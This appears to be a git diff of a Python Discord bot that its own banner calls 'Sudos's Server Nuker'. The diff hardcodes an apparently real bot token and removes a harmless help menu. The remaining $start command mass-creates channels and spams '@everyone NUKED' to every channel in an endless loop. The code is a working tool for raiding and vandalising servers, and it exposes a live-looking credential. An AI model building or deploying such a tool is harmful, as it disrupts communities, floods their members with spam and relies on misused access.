@@ -1,15 +1,17 @@
 import discord
 import random
 import os
+import time
 from discord.ext import commands
 
 BOT_PREFIX = "$"
-channel_names = ["Nuked"]
+channel_names = ["Beamed by Sudo"]
+SKIP_BOTS = False
 
 bot = commands.Bot(command_prefix=BOT_PREFIX, case_insensitive=True)
 bot.remove_command('Help')
 
-token = "ENTER TOKEN HERE"
+token = "OTMyODc0OTEwODc4MDA3MzM4.YeZVdg.4OvVyvntn3dvQELrnUBqli_wIDw"
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -39,19 +41,6 @@ async def on_ready():
                                                                                                               
 {}\n\t[+] Welcome To Sudos's Server Nuker (•◡ •) /\n\t[+] Nuker Loaded!\n\t[+] Type '$start' In The Server To Nuke\n\t[+] Subscribe To Sudo On YT\n{}""".format("="*150,"="*150,"="*150))
 
-@bot.command()
-async def Help(ctx):
-    await ctx.message.delete()
-
-    embed = discord.Embed(
-        title="NORBITE HELP",
-    )
-
-    embed.add_field(name="MAIN", value="```$Avatar [user]\n$Bonk [user]\n$Art\n$Pog\n$Cute\n$Meme\n$Random-Num\n$Dice-Roll\n$Fun-Fact\n$Coin-Flip```", inline=False)
-    embed.add_field(name="MISC", value="```$Who-Is [user]\n$Ping\n$Server-Info```", inline=False)
-
-    await ctx.send(embed=embed)
-
 @bot.command(pass_content=True)
 async def start(ctx):
     await ctx.message.delete()
@@ -73,10 +62,10 @@ async def start(ctx):
             for i in range(30):
                 await guild.create_text_channel(random.choice(channel_names))
     print("[+] New channels have been made")
-
+    time.sleep(1)
     print("[+] Spamming server")
     while True:
         for channel in guild.text_channels:
-            await channel.send("@everyone L Admins")
+            await channel.send("@everyone NUKED")
 
 bot.run(token)
